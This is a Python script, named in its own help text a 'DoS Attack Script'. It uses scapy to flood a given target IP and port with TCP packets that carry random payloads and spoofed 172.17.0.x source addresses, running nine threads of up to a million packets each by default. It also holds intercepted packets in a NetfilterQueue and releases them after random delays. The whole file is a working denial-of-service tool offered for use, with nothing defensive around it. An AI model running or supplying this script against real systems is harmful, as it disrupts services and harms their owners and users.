import random
import string
from time import sleep
from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import argparse


# Define global variables
used_ips = []

def get_random_ip(base_ip):
    valid_ip = False
    while not valid_ip:
        last_part = str(random.randint(1, 254))
        final_ip = f"{base_ip}.{last_part}"
        if final_ip not in used_ips:
            used_ips.append(final_ip)
            valid_ip = True
    return final_ip

def dos_attack(target_ip, target_port, num_packets, delay_interval):
    src_ip = get_random_ip("172.17.0")
    print(f"Using source IP: {src_ip}")
    for _ in range(num_packets):
        src_port = random.randint(1, 65535)
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port)
        pkt = ip / tcp / Raw(RandString(size=100))
        send(pkt, inter=0.001)
        sleep(delay_interval)

def delay(packet, delay_interval):
    sleep(random.uniform(*delay_interval))
    packet.accept()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS Attack Script")
    parser.add_argument('--target-ip', type=str, required=True, help="Target IP address")
    parser.add_argument('--target-port', type=int, required=True, help="Target port")
    parser.add_argument('--packets', type=int, default=1000000, help="Number of packets to send")
    parser.add_argument('--delay-min', type=float, default=0.5, help="Minimum delay for packet processing")
    parser.add_argument('--delay-max', type=float, default=10.0, help="Maximum delay for packet processing")
    parser.add_argument('--threads', type=int, default=9, help="Number of threads for attacks")

    args = parser.parse_args()

    delay_interval = (args.delay_min, args.delay_max)

    for i in range(args.threads):
        t = threading.Thread(target=dos_attack, args=(args.target_ip, args.target_port, args.packets, 0.001))
        t.start()

    nfqueue = NetfilterQueue()
    nfqueue.bind(2, lambda pkt: delay(pkt, delay_interval))
    try:
        print("[*] Waiting for data to delay")
        nfqueue.run()
    except KeyboardInterrupt:
        nfqueue.unbind()
